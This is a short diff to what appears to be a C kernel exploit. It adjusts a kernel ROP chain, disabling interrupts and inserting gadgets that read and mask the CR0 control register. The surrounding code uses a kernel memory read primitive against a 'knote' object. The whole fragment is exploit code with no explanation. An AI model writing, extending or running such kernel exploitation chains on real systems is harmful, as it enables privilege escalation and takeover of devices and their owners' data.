@@ -445,10 +445,15 @@ int main()
     stash_p[GP_REG_RBP] = 0;
     unsigned long long flag = 0;
     unsigned long long knote_0x40 = kread64(&o, victim, knote+0x40);
-    int leave = 182; // krop.length - 1
+    int leave = 187; // krop.length - 1
     unsigned long long krop[] = {
         0,
         __builtin_gadget_addr("cli"), // ensure we don't get preempted
+        kernel_base + READ_CR0_OFFSET,
+        __builtin_gadget_addr("pop rcx"),
+        ~8ull,
+        __builtin_gadget_addr("and rax, rcx"),
+        kernel_base + READ_CR0_OFFSET + 9,
         __builtin_gadget_addr("pop rdi"),
         stash_p,
         __builtin_gadget_addr("$saveall_addr"),
